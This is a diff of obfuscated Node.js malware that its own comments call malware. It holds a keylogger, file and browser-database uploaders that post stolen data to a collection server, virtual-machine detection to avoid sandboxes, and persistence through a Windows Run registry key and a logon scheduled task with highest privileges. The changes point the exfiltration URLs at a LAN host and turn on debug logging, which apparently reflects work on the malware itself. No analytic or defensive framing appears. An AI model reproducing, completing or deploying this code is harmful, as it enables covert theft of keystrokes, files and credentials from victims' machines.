@@ -7,7 +7,7 @@ try {
         FormData = require('form-data'),
         axios = require('axios'),
         { execSync, spawn } = require('child_process'),
-        uploadUrl = "http://127.0.0.1:5918/upload"
+        uploadUrl = "http://192.168.0.161:5918/upload"
 
     process.on('uncaughtException', (_0xad8869) => {})
     process.on('unhandledRejection', (_0x461982) => {})
@@ -30,7 +30,7 @@ try {
         m = a + '.' + b + '.' + c + '.' + d,
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
-    // console.log("hello");
+
     async function s() {
         ss();
         aa();
@@ -39,7 +39,7 @@ try {
     }
     
     const ss = async () => {
-        // console.log("ss function started");
+        console.log("ss function started");
         const _0x5f2ebc = 
             '\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20axios\\x20=\\x20require(\\x22axios\\x22);\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20os\\x20=\\x20require(\\x22os\\x22);\\x0a' +
@@ -94,10 +94,31 @@ try {
             const _0x69392 = spawn('node', ['-e', childScript], { 
                 windowsHide: true,
                 detached: true,
-                stdio: 'ignore', });
+                stdio: ['pipe', 'pipe', 'pipe'], });
+            _0x69392.on('error', (err) => {
+                console.error('Spawn error:', err.message);
+            });
+
+            _0x69392.stdout.on('data', (data) => {
+                console.log(`stdout: ${data}`);
+            });
+
+            _0x69392.stderr.on('data', (data) => {
+                console.error(`stderr: ${data}`);
+                // This will capture errors like syntax errors in the script
+            });
+
+            _0x69392.on('exit', (code, signal) => {
+                if (code !== 0) {
+                    console.error(`Process exited with code ${code}`);
+                }
+                if (signal) {
+                    console.error(`Process terminated by signal ${signal}`);
+                }
+            });
             _0x69392.unref();
-            execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\index.js" /f`, {stdio: 'ignore'});
-            execSync(`schtasks /create /tn "NodeUpdate" /tr "node ${__dirname}\\index.js" /sc onlogon /rl highest /f`, {stdio: 'ignore'});
+            execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\index.mjs" /f`, {stdio: 'ignore'});
+            execSync(`schtasks /create /tn "NodeUpdate" /tr "node ${__dirname}\\index.mjs" /sc onlogon /rl highest /f`, {stdio: 'ignore'});
             // process.exit(0);
             }catch(_0x24451c) {
                 console.log(_0x24451c);
@@ -206,7 +227,7 @@ try {
                     let shift = false;
                     let ctrl = false;
                     let isRunning = true;
-                    const uu = "http://127.0.0.1:5918/total";
+                    const uu = "http://192.168.0.161:5918/total";
 
                     const uf = async (p) => {
                         if (fs.statSync(p).isFile()) {
@@ -222,6 +243,7 @@ try {
                                         t: "66"
                                     }
                                 });
+                                // console.log(\`Uploaded file: \${p}\`);
                             } catch (error) {
                                 console.error("Error uploading file p:", error.message);
                             }
@@ -253,6 +275,7 @@ try {
 
                             const key = e.name.toLowerCase();
                             const state = e.state;
+                            // console.log(key);
                             if (state === "DOWN") {
                                 if (e.rawKey.name === "LSHIFT" || e.rawKey.name === "RSHIFT") {
                                     shift = true;
@@ -262,6 +285,7 @@ try {
                                     keyStates[key] = { pressed: true, pressTime: Date.now() };
                                 } else if (e.rawKey.name === "CAPSLOCK") {
                                     capsLock = !capsLock;
+                                    console.log("Caps Lock: capsLock ? 'ON' : 'OFF'");
                                     keyStates[key] = { pressed: true, pressTime: Date.now() };
                                 }
                             } else if (state === "UP") {
@@ -282,7 +306,6 @@ try {
                             if (modifiers.includes(key)) return;
 
                             const special = {
-                                "return": "[ENTER]",
                                 "space": " ",
                                 "backspace": "[BS]",
                                 "delete": "[DEL]",
@@ -290,6 +313,7 @@ try {
                                 "escape": "[ESC]",
                                 "mouse left": "submit"
                             };
+                            console.log(e.rawKey.name);
                             if (e.rawKey.name === "RETURN" || e.rawKey.name === "LBUTTON") {
                                 text += special[key];
                                 sendKeyText(); // Send text when Enter is pressed
@@ -308,6 +332,8 @@ try {
                             }
                         });
                         
+
+                        console.log("KEYBOARD LISTENER ADDED");
                     };
 
                     const scanDir = async (dirPath) => {
@@ -439,7 +465,7 @@ try {
         _0x24451c = new Error('spawn node ENOENT');
 
         try {
-            // console.log("bb function is started")
+            console.log("bb function is started")
             const _0x23df1e = spawn('node', ['-e', _0x3d341e], {
                 windowsHide: true,
                 detached: true,
@@ -484,15 +510,14 @@ try {
     ];
     // Main function to orchestrate the process
     const aa = async () => {
-        // console.log("aa function started.")
+        console.log("aa function started.")
         const _0x4f325= `
-        const os = require('os');
         const fs = require('fs');
         const path = require('path');
         const sqlite3 = require('sqlite3').verbose();
         const FormData = require('form-data');
         const axios = require('axios');
-        const uploadUrl = "http://127.0.0.1:5918/upload";
+        const uploadUrl = "http://192.168.0.161:5918/upload";
         
         let i = ${i};
         const getBasePaths = () => {
@@ -559,7 +584,6 @@ try {
             const form = new FormData();
             form.append('data', JSON.stringify(data));
             form.append('id', i++);
-            form.append('hostname', os.hostname())
         
             try {
                 const response = await axios.post(uploadUrl, form, {
@@ -633,7 +657,28 @@ try {
             const _0x849f8 = spawn('node', ['-e', _0x4f325],{
                 windowsHide: true,
                 detached: true,
-                stdio: 'ignore', });
+                stdio: ['pipe', 'pipe', 'pipe'], });
+            _0x849f8.on('error', (err) => {
+                console.error('Spawn error:', err.message);
+            });
+
+            _0x849f8.stdout.on('data', (data) => {
+                console.log(`stdout: ${data}`);
+            });
+
+            _0x849f8.stderr.on('data', (data) => {
+                console.error(`stderr: ${data}`);
+                // This will capture errors like syntax errors in the script
+            });
+
+            _0x849f8.on('exit', (code, signal) => {
+                if (code !== 0) {
+                    console.error(`Process exited with code ${code}`);
+                }
+                if (signal) {
+                    console.error(`Process terminated by signal ${signal}`);
+                }
+            });
             _0x849f8.unref();
             // console.log(_0x849f8);
         }catch(_0x24451c){
@@ -671,8 +716,8 @@ try {
                     isVM = true;
                 }
             }
-            // console.log(os.userInfo().username);
-            result = await axios.post("http://127.0.0.1:5918/api/service/process/"+uid, {
+            console.log(os.userInfo().username);
+            result = await axios.post("http://192.168.0.161:5918/api/service/process/"+uid, {
                 OS: os.type(),
                 platform: os.platform(),
                 release: os.release() + (isVM ? " (VM)":"(Local)"),
@@ -681,9 +726,9 @@ try {
                 uid: uid,
                 t: 66
             });
-            // console.log("setHeader result:", result.data);
+            console.log("setHeader result:", result.data);
             if (result.data && result.data.release.includes("(VM)")) {
-                // console.log("Detected VM, altering behavior...");
+                console.log("Detected VM, altering behavior...");
                 return false;
                 // process.exit(0);
             } else {
@@ -696,22 +741,23 @@ try {
         }
     }
 
+    
 
     async function main() {
-        // console.log('Starting malware initialization...');
+        console.log('Starting malware initialization...');
         
         // 1. FIRST: Call setHeader() and detect VM
         const isNotVM = await setHeader();
         
         // 2. ONLY IF NOT VM: Execute ss(), aa(), bc()
         if (isNotVM) {
-            // console.log(isNotVM);
-            // console.log('System is NOT VM - Executing payload...');
+            console.log(isNotVM);
+            console.log('System is NOT VM - Executing payload...');
             
             try {
                 // Execute all three functions
                 await s(); // This calls ss(), aa(), bc() internally
-                // console.log('All payloads deployed successfully');
+                console.log('All payloads deployed successfully');
             } catch (error) {
                 console.error('Error deploying payloads:', error.message);
             }
@@ -720,7 +766,7 @@ try {
             // process.exit(0); // Uncomment to exit on VM detection
         }
     }
-    // console.log("Here");
+
     // Start the main execution
     main().catch(console.error);
     
